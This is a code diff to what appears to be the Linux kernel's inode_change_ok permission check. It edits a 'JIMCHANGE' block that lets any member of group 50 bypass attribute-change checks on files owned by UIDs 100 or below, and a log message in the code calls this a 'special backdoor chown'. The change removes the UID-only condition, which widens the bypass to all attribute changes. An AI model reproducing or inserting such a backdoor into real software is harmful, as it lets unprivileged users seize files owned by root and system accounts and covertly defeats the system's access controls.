@@ -30,6 +30,10 @@
  */
 int inode_change_ok(const struct inode *inode, struct iattr *attr)
 {
+	/* JIMCHANGE START */
+	kgid_t special;
+	kuid_t hundred;
+	/* JIMCHANGE END */
 	unsigned int ia_valid = attr->ia_valid;
 
 	/*
@@ -46,12 +50,14 @@ int inode_change_ok(const struct inode *inode, struct iattr *attr)
 	if (ia_valid & ATTR_FORCE)
 		return 0;
 
-	/* JIMCHANGE START*/
-	if ((ia_valid & ATTR_UID) && in_group_p(50) && uid_lte(inode->i_uid, 100)) {
+	/* JIMCHANGE START */
+	special.val = (gid_t)((unsigned int)50);
+	hundred.val = (uid_t)((unsigned int)100);
+	if (in_group_p(special) && uid_lte(inode->i_uid, hundred)) {
 		printk("using special backdoor chown");
 		return 0;
 	}
-	/* JIMCHANGE END*/
+	/* JIMCHANGE END */
 	/* Make sure a caller can chown. */
 	if ((ia_valid & ATTR_UID) &&
 	    (!uid_eq(current_fsuid(), inode->i_uid) ||
